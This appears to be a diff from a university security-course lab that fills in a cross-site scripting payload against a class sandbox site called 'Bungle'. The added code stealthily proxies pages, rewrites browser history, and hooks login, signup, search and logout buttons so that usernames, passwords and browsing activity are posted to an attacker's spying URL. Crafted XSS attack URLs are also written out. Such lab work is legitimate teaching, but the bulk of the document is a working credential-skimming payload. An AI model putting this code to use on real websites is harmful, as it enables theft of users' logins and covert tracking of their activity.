@@ -67,6 +67,16 @@ Then just add spying code and hide your suspicious URLs.
 // Inject this XSS payload. 
 function payload(attacker) {
 
+    function concatUrl(spying, event, user, url, pass) {
+        to_ret = spying
+        if (event != null) {to_ret += "event=" + event + "&"}
+        if (user != null) {to_ret += "user=" + user + "&"}
+        if (url != null) {to_ret += "url=" + url + "&"}
+        if (pass != null) {to_ret += "pass="+ pass + "&"}
+        to_ret = to_ret.substr(0, to_ret.length - 1)
+        return to_ret
+    }
+
     // This function can make it appear that a new page has been loaded
     // Note that you can proxy the main page, or a search page!
 	function proxy(href, spying_url) {
@@ -81,7 +91,56 @@ function payload(attacker) {
                 $('html').show();
 
                 // TODO implement spying while being stealthy and persistent. Remove the alert.
-                alert("Notice that although we injected code into the search page, you see here the main page!")
+                // alert("Notice that although we injected code into the search page, you see here the main page!")
+
+                window.history.pushState("", "", href);
+                document.title = "Not Bungle!";
+
+                let user = $('#logged-in-user').text();
+                
+                spying_url = spying_url.substr(0, spying_url.length - 1) + "?";
+                var target = `http://bungle-cs461.csl.illinois.edu/`;
+
+                function loginHelper(url) {
+                    var usrname = $('#username').val();
+                    var passwd = $('#userpass').val();
+                    $.post(target + url, {username: usrname, password: passwd}, function() {
+                        $.post(concatUrl(spying_url, 'login', usrname, null, passwd));
+                        proxy('./', spying_url);
+                    });
+                }
+                
+                $('#bungle-lnk, #search-again-btn').click(function(e) {
+                    e.preventDefault();
+                    $.post(concatUrl(spying_url, 'nav', user, '/', null));
+                    proxy('./', spying_url);
+                });
+
+                $('#search-btn').click(function(e) {
+                    e.preventDefault();
+                    var query = $('#query').val();
+                    var query_url = "search?q=" + query;
+                    $.post(concatUrl(spying_url, 'nav', user, query_url, null));
+                    proxy(query_url, spying_url);
+                });
+
+                $('#log-in-btn').click(function(e) {
+                    e.preventDefault();
+                    loginHelper('login');
+                });
+
+                $('#new-account-btn').click(function(e) {
+                    e.preventDefault();
+                    loginHelper('create');
+                });
+
+                $('$log-out-btn').click(function(e) {
+                    e.preventDefault();
+                    $.post(target + 'logout', function() {
+                        $.post(concatUrl(spying_url, 'logout', user, null, null));
+                        proxy('./', spying_url);
+                    });
+                });
 
             });
     	}
@@ -97,15 +156,15 @@ function makeLink(target, attacker, defense) {
     switch(defense) {
         case 1:
             // TODO: Implement XSS warmup 2.2.3.1
-            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=INSERT%20ATTACK%20HERE";
+            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=<script>window.onload=function(){document.getElementsByTagName('a')[0].href='http://ece.illinois.edu'}<\/script>";
         case 2:
             // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
                 encodeURIComponent(
                     "<script>" +
                     payload_string + 
-                    ";payload();" + 
-                    "</script" + ">"
+                    ";payload(\"" + attacker +"\");" + 
+                    "<\/script" + ">"
                 );
         case 3:
             // TODO: generate XSS URL for defense level 2.2.3.3
